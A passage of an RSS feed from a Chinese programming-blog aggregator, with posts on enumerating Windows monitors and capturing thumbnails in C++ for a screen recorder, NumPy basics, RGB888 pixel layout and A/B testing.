转列&amp;#xff1a;transition 涡脱落&amp;#xff1a;vortex shedding 涡分离&amp;#xff1a;vortex rupture 气动噪声&amp;#xff1a…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:12 +0000</pubDate>
    </item>
    <item>
      <title>FFMPEG录屏（19）--- 枚举Windows下的屏幕列表，并获取名称、缩略图</title>
      <link>https://www.ppmy.cn/news/1540370.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维FFMPEG录屏（19）--- 枚举Windows下的屏幕列表，并获取名称、缩略图news/2025/10/31 17:53:11/在Windows下枚举显示器列表并获取名称、缩略图在Windows系统中，枚举显示器列表并获取它们的名称和缩略图是一个常见的需求。本文将详细介绍如何实现这一功能，涉及到的主要技术包括Windows API和C++编程。获取显示器信息首先，我们需要一个函数来枚举所有的显示器，并获取它们的名称和缩略图。intenum_screens(enumerator_param&amp;param){BOOL enum_result=TRUE;for(intdevice_index=0;;++device_index){DISPLAY_DEVICEW device;device.cb=sizeof(device);enum_result=EnumDisplayDevicesW(NULL,device_index,&amp;device,0);if(!enum_result){break;}if(!(device.StateFlags&amp;DISPLAY_DEVICE_ACTIVE)){continue;}boolis_primary=false;if(device.StateFlags&amp;DISPLAY_DEVICE_PRIMARY_DEVICE){is_primary=true;}DEVMODEW device_mode;device_mode.dmSize=sizeof(device_mode);device_mode.dmDriverExtra=0;BOOL result=EnumDisplaySettingsExW(device.DeviceName,ENUM_CURRENT_SETTINGS,&amp;device_mode,0);if(!result){break;}traa_screen_source_info screen_info;screen_info.is_window=false;screen_info.id=device_index;screen_info.rect=traa_rect(device_mode.dmPosition.x,device_mode.dmPosition.y,device_mode.dmPelsWidth,device_mode.dmPelsHeight);autoutf8_name=string_trans::unicode_to_utf8(device.DeviceName);strncpy_s(const_cast&lt;char*&gt;(screen_info.title),sizeof(screen_info.title)-1,utf8_name.c_str(),utf8_name.length());if(param.thumbnail_size.width&gt;0&amp;&amp;param.thumbnail_size.height&gt;0&amp;&amp;param.thumbnail_instance){capture_utils::get_screen_image_by_gdi(screen_info.rect,param.thumbnail_size,const_cast&lt;uint8_t**&gt;(&amp;screen_info.thumbnail_data),screen_info.thumbnail_size);}param.infos.push_back(screen_info);}returntraa_error::TRAA_ERROR_NONE;}这个函数使用EnumDisplayDevicesW来枚举所有的显示器，并使用EnumDisplaySettingsExW来获取每个显示器的设置。然后，我们将显示器的信息存储在traa_screen_source_info结构体中，并将其添加到参数的infos向量中。获取缩略图获取显示器的缩略图是一个关键步骤。我们需要使用GDI（图形设备接口）来捕获屏幕图像，并将其缩放到我们需要的大小。boolcapture_utils::get_screen_image_by_gdi(consttraa_rect&amp;rect,consttraa_size&amp;target_size,uint8_t**data,traa_size&amp;scaled_size){constdesktop_size scaled_desktop_size=calc_scaled_size(desktop_size(rect.right-rect.left,rect.bottom-rect.top),desktop_size(target_size.width,target_size.height));if(scaled_desktop_size.is_empty()){LOG_ERROR("calc scaled scaled_size failed, get empty scaled_size");returnfalse;}HDC screen_dc=::GetDC(nullptr);if(!screen_dc){LOG_ERROR("get screen dc failed: {}",::GetLastError());returnfalse;}boolresult=false;HANDLE section=nullptr;uint8_t*bitmap_data=nullptr;HBITMAP bitmap=nullptr;HDC compatible_dc=nullptr;HGDIOBJ old_obj=nullptr;do{constexprintbytes_per_pixel=desktop_frame::kBytesPerPixel;BITMAPINFO bmi={};bmi.bmiHeader.biWidth=scaled_desktop_size.width();bmi.bmiHeader.biHeight=-scaled_desktop_size.height();bmi.bmiHeader.biPlanes=1;bmi.bmiHeader.biBitCount=32;bmi.bmiHeader.biSize=sizeof(bmi.bmiHeader);bmi.bmiHeader.biSizeImage=scaled_desktop_size.width()*scaled_desktop_size.height()*bytes_per_pixel;bitmap=::CreateDIBSection(screen_dc,&amp;bmi,DIB_RGB_COLORS,(void**)&amp;bitmap_data,section,0);if(!bitmap){LOG_ERROR("create dib section failed: {}",::GetLastError());break;}compatible_dc=::CreateCompatibleDC(screen_dc);old_obj=::SelectObject(compatible_dc,bitmap);if(!old_obj||old_obj==HGDI_ERROR){LOG_ERROR("select object failed: {}",::GetLastError());break;}SetStretchBltMode(compatible_dc,COLORONCOLOR);result=::StretchBlt(compatible_dc,0,0,scaled_desktop_size.width(),scaled_desktop_size.height(),screen_dc,rect.left,rect.top,rect.right-rect.left,rect.bottom-rect.top,SRCCOPY|CAPTUREBLT);if(!result){LOG_ERROR("stretch blt failed: {}",::GetLastError());break;}*data=newuint8_t[bmi.bmiHeader.biSizeImage];if(!*data){LOG_ERROR("alloc memory for thumbnail data failed: {}",::GetLastError());break;}memcpy_s(*data,bmi.bmiHeader.biSizeImage,bitmap_data,bmi.bmiHeader.biSizeImage);scaled_size=scaled_desktop_size.to_traa_size();}while(0);if(bitmap){::DeleteObject(bitmap);}if(compatible_dc){if(old_obj){::SelectObject(compatible_dc,old_obj);}::DeleteDC(compatible_dc);}::ReleaseDC(nullptr,screen_dc);if(!result&amp;&amp;*data){delete[]*data;*data=nullptr;}returnresult;}这个函数使用CreateDIBSection创建一个设备独立位图（DIB），然后使用StretchBlt将屏幕图像复制到位图中。最后，我们将位图数据复制到一个新的缓冲区中，并返回缩放后的大小。整合一切最后，我们需要一个函数来整合所有的步骤，枚举显示器并获取它们的名称和缩略图。intscreen_source_info_enumerator::enum_screen_source_info(consttraa_size icon_size,consttraa_size thumbnail_size,constunsignedintexternal_flags,traa_screen_source_info**infos,int*count){std::unique_ptr&lt;thumbnail&gt;thumbnail_instance;if(thumbnail_size.width&gt;0&amp;&amp;thumbnail_size.height&gt;0){thumbnail_instance.reset(newthumbnail());}enumerator_param param={icon_size,thumbnail_size,external_flags,{},thumbnail_instance.get()};enum_windows(param);enum_screens(param);*count=static_cast&lt;int&gt;(param.infos.size());*infos=reinterpret_cast&lt;traa_screen_source_info*&gt;(newtraa_screen_source_info[param.infos.size()]);if(*infos==nullptr){LOG_ERROR("alloca memroy for infos failed: {}",::GetLastError());returntraa_error::TRAA_ERROR_OUT_OF_MEMORY;}for(size_t i=0;i&lt;param.infos.size();++i){auto&amp;source_info=param.infos[i];auto&amp;dest_info=(*infos)[i];memcpy(&amp;dest_info,&amp;source_info,sizeof(traa_screen_source_info));if(std::strlen(source_info.title)&gt;0){strncpy_s(const_cast&lt;char*&gt;(dest_info.title),sizeof(dest_info.title)-1,source_info.title,std::strlen(source_info.title));}if(std::strlen(source_info.process_path)&gt;0){strncpy_s(const_cast&lt;char*&gt;(dest_info.process_path),sizeof(dest_info.process_path)-1,source_info.process_path,std::strlen(source_info.process_path));}}returntraa_error::TRAA_ERROR_NONE;}这个函数创建一个thumbnail实例，并调用enum_windows和enum_screens来枚举窗口和显示器。然后，它将枚举到的信息复制到一个新的缓冲区中，并返回信息的数量。通过上述步骤，我们可以在Windows系统中枚举显示器列表，并获取它们的名称和缩略图。这一过程涉及到Windows API的使用、窗口属性的获取、图标和缩略图的处理等多个方面。希望本文能对您有所帮助。最近有点懒了，这还是copilot生成的。。。源码传送traahttp://www.ppmy.cn/news/1540370.html相关文章【升华】python基础包NumPy学习NumPy是使用Python进行科学计算的基础软件包。除其他外&amp;#xff0c;它包括&amp;#xff1a; 
功能强大的N维数组对象。精密广播功能函数。集成 C/C和Fortran 代码的工具。强大的线性代数、傅立叶变换和随机数功能。 
# 1、安装包
$ pip install numpy# 2、进入python的交互式界面
$…阅读更多...FFmpeg 4.3 音视频-多路H265监控录放C++开发四 ：RGB颜色一  RGB 的意义&amp;#xff1f; 为什么要从RGB 开始讲起呢&amp;#xff1f; 
因为最终传输到显卡显示器的颜色都是RGB 
即使能处理YUV的API&amp;#xff0c;本质上也是帮你做了从 YUV 到 RGB的转换。 RGB888 表示 R 占8bit&amp;#xff0c;G 占8bit&amp;#xff0c;B 占8bit&amp;#xff0c;也就是每一…阅读更多...解锁A/B测试：如何用数据驱动的实验提升你的网站和应用来源&amp;#xff1a;Gallo, A. (2017, June 28). A refresher on A/B testing. Harvard Business Review. https://hbr.org/2017/06/a-refresher-on-ab-testing 
在数字化时代&amp;#xff0c;我们每天都在被大量的信息和广告轰炸。那么&amp;#xff0c;如何让你的网站或应用脱颖而出&amp;…阅读更多...通信工程学习：什么是VPN虚拟私人网络VPN&amp;#xff1a;虚拟私人网络 VPN&amp;#xff0c;即虚拟私人网络&amp;#xff08;Virtual Private Network&amp;#xff09;&amp;#xff0c;是一种通过公共网络&amp;#xff08;如互联网&amp;#xff09;建立的加密连接&amp;#xff0c;用于保护用户的网络连接和数据传输的安全与隐私。以下是关于VPN的详细…阅读更多...QGroundControl最新版本MacOS平台编译(使用CMakeLists.txt)1.下载源码: 
git clone https://github.com/mavlink/qgroundcontrol.git --recursive 2.安装依赖： 
brew install GStreamer 设置环境变量：GST_PLUGIN_PATH 安装SDL2: 
brew install SDL2阅读更多...Qt 自绘开关按钮以及设计器中的提升为用法文章目录 自绘按钮实现概要效果图代码 提升为用法介绍步骤 总结 自绘按钮实现 
概要 
当我们需要一个开关样式的QPushbutton&amp;#xff0c;没有图片的话&amp;#xff0c;我们可以采用自绘的形式实现。且使用QtDesinger中提升为Promote to的功能加入界面中&amp;#xff0c;而不是使用代码的…阅读更多...流体力学笔记目录 1、名词2、湍流与涡流3 涡激振动4 压力面与吸力面参考&amp;#xff1a;[空气动力学的“他山之石”](https://zhuanlan.zhihu.com/p/412542513) 1、名词 
转列&amp;#xff1a;transition 涡脱落&amp;#xff1a;vortex shedding 涡分离&amp;#xff1a;vortex rupture 气动噪声&amp;#xff1a…阅读更多...SpringBoot配置文件敏感信息如何加密？及踩坑总结(全面讲解)目录 
1.添加依赖 
2.接下来去生成密文 
3.然后在命令行窗口通过mvn命令去调用这个插件 
4.接下来会生成对对应的密文&amp;#xff0c;然后去替换application.properties中的对应内容 
5.运行程序解密 在软件开发中&amp;#xff0c;保护敏感信息如数据库密码、API密钥等是至关重要的。J…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:11 +0000</pubDate>
    </item>
    <item>
      <title>【升华】python基础包NumPy学习</title>
      <link>https://www.ppmy.cn/news/1540368.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【升华】python基础包NumPy学习news/2025/10/31 17:53:09/NumPy是使用Python进行科学计算的基础软件包。除其他外，它包括：功能强大的N维数组对象。精密广播功能函数。集成 C/C+和Fortran 代码的工具。强大的线性代数、傅立叶变换和随机数功能。# 1、安装包
$ pip install numpy# 2、进入python的交互式界面
$ python -i# 3、使用Numpy
&gt;&gt;&gt; from numpy import *
&gt;&gt;&gt; eye(4)# 4、输出结果
array([[1., 0., 0., 0.],[0., 1., 0., 0.],[0., 0., 1., 0.],[0., 0., 0., 1.]])通过菜鸟教程学习：NumPy 教程 | 菜鸟教程numpy数据类型NumPy 创建数组ndarray 数组除了可以使用底层 ndarray 构造器来创建外，也可以通过以下几种方式来创建。numpy.emptynumpy.empty 方法用来创建一个指定形状（shape）、数据类型（dtype）且未初始化的数组：import numpy as np 
x = np.empty([3,2], dtype = int) 
print (x)import numpy as np# 默认为浮点数
x = np.zeros(5) 
print(x)# 设置类型为整数
y = np.zeros((5,), dtype = int) 
print(y)# 自定义类型
z = np.zeros((2,2), dtype = [('x', 'i4'), ('y', 'i4')])  
print(z)输出结果：[0. 0. 0. 0. 0.]
[0 0 0 0 0]
[[(0, 0) (0, 0)][(0, 0) (0, 0)]]NumPy 字符串函数以下函数用于对 dtype 为 numpy.string_ 或 numpy.unicode_ 的数组执行向量化字符串操作。 它们基于 Python 内置库中的标准字符串函数。这些函数在字符数组类（numpy.char）中定义。import numpy as np print ('连接两个字符串：')
print (np.char.add(['hello'],[' xyz']))
print ('\n')print ('连接示例：')
print (np.char.add(['hello', 'hi'],[' abc', ' xyz']))NumPy MatplotlibMatplotlib 是 Python 的绘图库。 它可与 NumPy 一起使用，提供了一种有效的 MatLab 开源替代方案。 它也可以和图形工具包一起使用，如 PyQt 和 wxPython。import numpy as npfrom matplotlib import pyplot as pltx = np.arange(1,11)y =  2  * x +  5plt.title("Matplotlib demo")plt.xlabel("x axis caption")plt.ylabel("y axis caption")plt.plot(x,y)plt.show()import numpy as np 
from matplotlib import pyplot as plt x = np.arange(1,11) 
y =  2  * x +  5 
plt.title("Matplotlib demo") 
plt.xlabel("x axis caption") 
plt.ylabel("y axis caption") 
plt.plot(x,y) 
plt.show()import numpy as np 
from matplotlib import pyplot as plt 
import matplotlib# fname 为 你下载的字体库路径，注意 SourceHanSansSC-Bold.otf 字体的路径
zhfont1 = matplotlib.font_manager.FontProperties(fname="SourceHanSansSC-Bold.otf") x = np.arange(1,11) 
y =  2  * x +  5 
plt.title("菜鸟教程 - 测试", fontproperties=zhfont1) # fontproperties 设置中文显示，fontsize 设置字体大小
plt.xlabel("x 轴", fontproperties=zhfont1)
plt.ylabel("y 轴", fontproperties=zhfont1)
plt.plot(x,y) 
plt.show()http://www.ppmy.cn/news/1540368.html相关文章FFmpeg 4.3 音视频-多路H265监控录放C++开发四 ：RGB颜色一  RGB 的意义&amp;#xff1f; 为什么要从RGB 开始讲起呢&amp;#xff1f; 
因为最终传输到显卡显示器的颜色都是RGB 
即使能处理YUV的API&amp;#xff0c;本质上也是帮你做了从 YUV 到 RGB的转换。 RGB888 表示 R 占8bit&amp;#xff0c;G 占8bit&amp;#xff0c;B 占8bit&amp;#xff0c;也就是每一…阅读更多...解锁A/B测试：如何用数据驱动的实验提升你的网站和应用来源&amp;#xff1a;Gallo, A. (2017, June 28). A refresher on A/B testing. Harvard Business Review. https://hbr.org/2017/06/a-refresher-on-ab-testing 
在数字化时代&amp;#xff0c;我们每天都在被大量的信息和广告轰炸。那么&amp;#xff0c;如何让你的网站或应用脱颖而出&amp;…阅读更多...通信工程学习：什么是VPN虚拟私人网络VPN&amp;#xff1a;虚拟私人网络 VPN&amp;#xff0c;即虚拟私人网络&amp;#xff08;Virtual Private Network&amp;#xff09;&amp;#xff0c;是一种通过公共网络&amp;#xff08;如互联网&amp;#xff09;建立的加密连接&amp;#xff0c;用于保护用户的网络连接和数据传输的安全与隐私。以下是关于VPN的详细…阅读更多...QGroundControl最新版本MacOS平台编译(使用CMakeLists.txt)1.下载源码: 
git clone https://github.com/mavlink/qgroundcontrol.git --recursive 2.安装依赖： 
brew install GStreamer 设置环境变量：GST_PLUGIN_PATH 安装SDL2: 
brew install SDL2阅读更多...Qt 自绘开关按钮以及设计器中的提升为用法文章目录 自绘按钮实现概要效果图代码 提升为用法介绍步骤 总结 自绘按钮实现 
概要 
当我们需要一个开关样式的QPushbutton&amp;#xff0c;没有图片的话&amp;#xff0c;我们可以采用自绘的形式实现。且使用QtDesinger中提升为Promote to的功能加入界面中&amp;#xff0c;而不是使用代码的…阅读更多...流体力学笔记目录 1、名词2、湍流与涡流3 涡激振动4 压力面与吸力面参考&amp;#xff1a;[空气动力学的“他山之石”](https://zhuanlan.zhihu.com/p/412542513) 1、名词 
转列&amp;#xff1a;transition 涡脱落&amp;#xff1a;vortex shedding 涡分离&amp;#xff1a;vortex rupture 气动噪声&amp;#xff1a…阅读更多...SpringBoot配置文件敏感信息如何加密？及踩坑总结(全面讲解)目录 
1.添加依赖 
2.接下来去生成密文 
3.然后在命令行窗口通过mvn命令去调用这个插件 
4.接下来会生成对对应的密文&amp;#xff0c;然后去替换application.properties中的对应内容 
5.运行程序解密 在软件开发中&amp;#xff0c;保护敏感信息如数据库密码、API密钥等是至关重要的。J…阅读更多...leaflet(一)初始化地图Leaflet 与天地图结合使用&amp;#xff0c;可以通过天地图提供的 API 获取地图瓦片&amp;#xff0c;并在 Leaflet 地图上显示。 
1. 安装依赖 
首先&amp;#xff0c;确保你已经安装了 Leaflet 和 Vue&amp;#xff1a; 
npm install leaflet
npm install vue-leaflet
npm install leaflet.tilela…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:09 +0000</pubDate>
    </item>
    <item>
      <title>FFmpeg 4.3 音视频-多路H265监控录放C++开发四 ：RGB颜色</title>
      <link>https://www.ppmy.cn/news/1540367.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维FFmpeg 4.3 音视频-多路H265监控录放C++开发四 ：RGB颜色news/2025/10/31 17:53:08/一  RGB 的意义？为什么要从RGB 开始讲起呢？因为最终传输到显卡显示器的颜色都是RGB即使能处理YUV的API，本质上也是帮你做了从 YUV 到 RGB的转换。RGB888 表示 R 占8bit，G 占8bit，B 占8bit，也就是每一个都占8比特（一个字节），那么也就说用3个字节就可以表示 RGB888。用unsigned char 表示 1个字节我们知道一个字节有8位， 就是说表达的10进制 为 0--25500000000   ------   11111111因此也可以看到一般表示法有 255 255 255 或者 FF FF FF那么这个一个 RGB888 代表的是啥呢？实际上就是代表的屏幕上的一个像素点。例如 1280x720 的图片，在不考虑 字节对齐的 概念下，就有 720 行，每一行有1280个点，每一个点也叫一个像素，都对应 一个 RGB888。也有RGBA8888 的形式，实际上多了个一A，也占用8bit（一个字节），是透明度的意思，这个一般在用到 两张图片的叠加的时候，这个透明度A会用到。二  写一个RGB图片的代码。我们来看一个 6x3 的RGB888图片在内存中应该是什么样子的？我们知道每一个像素点都是一个RGB888，那么一个像素点应该是8个bit的R + 8个bit的G+8个bit的B 组成的，也可以说成是 1byte的R + 1byte的G + 1byte的B组成如下是一个像素点，那么每一行就是有 三个这样的像素点那么我们有6行，应该就是下面这样了实际上在内存中上述图片都是顺序排列的，没有列的概念，我们画成上面的样子，只是为了方便理解。我们使用QT 上显示这个自己想画的图片。要使用的图片为 QTEvent的重载图像的功能。http://www.ppmy.cn/news/1540367.html相关文章解锁A/B测试：如何用数据驱动的实验提升你的网站和应用来源&amp;#xff1a;Gallo, A. (2017, June 28). A refresher on A/B testing. Harvard Business Review. https://hbr.org/2017/06/a-refresher-on-ab-testing 
在数字化时代&amp;#xff0c;我们每天都在被大量的信息和广告轰炸。那么&amp;#xff0c;如何让你的网站或应用脱颖而出&amp;…阅读更多...通信工程学习：什么是VPN虚拟私人网络VPN&amp;#xff1a;虚拟私人网络 VPN&amp;#xff0c;即虚拟私人网络&amp;#xff08;Virtual Private Network&amp;#xff09;&amp;#xff0c;是一种通过公共网络&amp;#xff08;如互联网&amp;#xff09;建立的加密连接&amp;#xff0c;用于保护用户的网络连接和数据传输的安全与隐私。以下是关于VPN的详细…阅读更多...QGroundControl最新版本MacOS平台编译(使用CMakeLists.txt)1.下载源码: 
git clone https://github.com/mavlink/qgroundcontrol.git --recursive 2.安装依赖： 
brew install GStreamer 设置环境变量：GST_PLUGIN_PATH 安装SDL2: 
brew install SDL2阅读更多...Qt 自绘开关按钮以及设计器中的提升为用法文章目录 自绘按钮实现概要效果图代码 提升为用法介绍步骤 总结 自绘按钮实现 
概要 
当我们需要一个开关样式的QPushbutton&amp;#xff0c;没有图片的话&amp;#xff0c;我们可以采用自绘的形式实现。且使用QtDesinger中提升为Promote to的功能加入界面中&amp;#xff0c;而不是使用代码的…阅读更多...流体力学笔记目录 1、名词2、湍流与涡流3 涡激振动4 压力面与吸力面参考&amp;#xff1a;[空气动力学的“他山之石”](https://zhuanlan.zhihu.com/p/412542513) 1、名词 
转列&amp;#xff1a;transition 涡脱落&amp;#xff1a;vortex shedding 涡分离&amp;#xff1a;vortex rupture 气动噪声&amp;#xff1a…阅读更多...SpringBoot配置文件敏感信息如何加密？及踩坑总结(全面讲解)目录 
1.添加依赖 
2.接下来去生成密文 
3.然后在命令行窗口通过mvn命令去调用这个插件 
4.接下来会生成对对应的密文&amp;#xff0c;然后去替换application.properties中的对应内容 
5.运行程序解密 在软件开发中&amp;#xff0c;保护敏感信息如数据库密码、API密钥等是至关重要的。J…阅读更多...leaflet(一)初始化地图Leaflet 与天地图结合使用&amp;#xff0c;可以通过天地图提供的 API 获取地图瓦片&amp;#xff0c;并在 Leaflet 地图上显示。 
1. 安装依赖 
首先&amp;#xff0c;确保你已经安装了 Leaflet 和 Vue&amp;#xff1a; 
npm install leaflet
npm install vue-leaflet
npm install leaflet.tilela…阅读更多...【黑马Redis原理篇】Redis网络模型来源视频 [16,27]  文章目录 1.用户空间和内核空间空间划分缓冲区 2.IO模型2.1 阻塞IO2.2 非阻塞IO2.3 IO多路复用2.3.1 阻塞和非阻塞的对比2.3.2 IO多路复用2.3.3 监听FD方式、通知的方式&amp;#xff0c;有多种实现 2.4 信号驱动IO2.5 异步IO2.6 真正的同步和异步 1.用户空间和内…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:08 +0000</pubDate>
    </item>
    <item>
      <title>解锁A/B测试：如何用数据驱动的实验提升你的网站和应用</title>
      <link>https://www.ppmy.cn/news/1540366.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维解锁A/B测试：如何用数据驱动的实验提升你的网站和应用news/2025/10/31 17:53:07/来源：Gallo, A. (2017, June 28). A refresher on A/B testing.Harvard Business Review. https://hbr.org/2017/06/a-refresher-on-ab-testing在数字化时代，我们每天都在被大量的信息和广告轰炸。那么，如何让你的网站或应用脱颖而出，吸引用户的注意力呢？答案可能就藏在一个小小的A/B测试中。今天，我们就来聊聊这个听起来有点技术范儿，但其实非常实用的工具。A/B测试是什么A/B测试是一种简单却强大的方法，是随机控制实验的一种基本形式，它能帮助我们比较两种不同的设计方案，看看哪一种更受欢迎或更有效。想象一下，你在经营一家网站，想要增加用户的点击率。你可能会想，是大按钮更吸引人，还是小按钮更有效？A/B测试就能帮你找到答案。你只需创建两个版本的网页，一个使用大按钮（版本B），另一个使用小按钮（版本A）。然后，你随机向一半的访客展示大按钮，另一半展示小按钮。通过比较两个版本的点击率，你就可以知道哪种按钮更受欢迎。但A/B测试不仅仅是关于按钮大小。它可以用来测试网站设计、在线优惠、标题、产品描述等几乎所有东西。这种方法的美妙之处在于，它能够在真实环境中实时进行，而且可以扩展到成千上万的参与者。A/B测试的历史虽然A/B测试听起来很现代，但它的概念已经有将近100年的历史了。最初，这种测试方法被用在农业实验中，比如研究不同肥料对作物的影响。后来，它被引入医学领域，用于临床试验。到了20世纪60年代和70年代，营销人员开始用它来评估直接响应广告的效果。到了90年代，随着互联网的兴起，A/B测试开始以我们今天熟知的形式出现。如何进行A/B测试进行A/B测试的第一步是确定你想要测试的内容。比如，你想要测试订阅按钮的大小。然后，你需要决定如何衡量这个设计的表现。在这个例子中，我们用点击按钮的访客数量作为衡量标准。在实际操作中，你需要随机分配用户到两个版本中，这样可以确保其他因素（比如用户使用的手机还是桌面电脑）不会影响结果。通过比较两个版本的数据，你可以判断出哪个版本的表现更好。如何解读A/B测试结果进行A/B测试后，你可能会得到两个转化率：一个针对看到原始设计的访客，另一个针对看到测试设计的访客。如果测试结果显示测试版本的转化率高于原始版本，这是否意味着你应该立即采用新设计呢？答案是：这取决于成本。如果实施新设计的成本很低，那么尝试新设计可能是一个好主意。如果成本很高，你可能需要更仔细地考虑。A/B测试的常见误区尽管A/B测试非常流行，但很多人在进行测试时会犯一些常见的错误。首先，许多人在测试完成前就急于做出决策。他们看到初步数据就急于下结论，而没有让测试运行足够的时间来得到可靠的结果。其次，有些人在测试中关注了太多的指标。这可能导致所谓的“虚假相关性”，即错误地将两个没有因果关系的变量联系起来。在设计测试时，你应该提前决定要关注哪些指标，并集中精力在这些指标上。最后，很多公司在得到一次显著的测试结果后就停止测试，没有进行足够的重复测试来确保结果的准确性。即使一次测试的结果是统计显著的，也有可能是假阳性。定期重复测试可以帮助你排除错误结果的可能性。总的来说，A/B测试是一个快速了解问题的有效工具，但它并不是万能的。更复杂的实验可能会给你更可靠的数据。不过，A/B测试的好处在于，它发生得非常快，如果测试结果不理想，你总可以迅速尝试另一种方法。http://www.ppmy.cn/news/1540366.html相关文章通信工程学习：什么是VPN虚拟私人网络VPN&amp;#xff1a;虚拟私人网络 VPN&amp;#xff0c;即虚拟私人网络&amp;#xff08;Virtual Private Network&amp;#xff09;&amp;#xff0c;是一种通过公共网络&amp;#xff08;如互联网&amp;#xff09;建立的加密连接&amp;#xff0c;用于保护用户的网络连接和数据传输的安全与隐私。以下是关于VPN的详细…阅读更多...QGroundControl最新版本MacOS平台编译(使用CMakeLists.txt)1.下载源码: 
git clone https://github.com/mavlink/qgroundcontrol.git --recursive 2.安装依赖： 
brew install GStreamer 设置环境变量：GST_PLUGIN_PATH 安装SDL2: 
brew install SDL2阅读更多...Qt 自绘开关按钮以及设计器中的提升为用法文章目录 自绘按钮实现概要效果图代码 提升为用法介绍步骤 总结 自绘按钮实现 
概要 
当我们需要一个开关样式的QPushbutton&amp;#xff0c;没有图片的话&amp;#xff0c;我们可以采用自绘的形式实现。且使用QtDesinger中提升为Promote to的功能加入界面中&amp;#xff0c;而不是使用代码的…阅读更多...流体力学笔记目录 1、名词2、湍流与涡流3 涡激振动4 压力面与吸力面参考&amp;#xff1a;[空气动力学的“他山之石”](https://zhuanlan.zhihu.com/p/412542513) 1、名词 
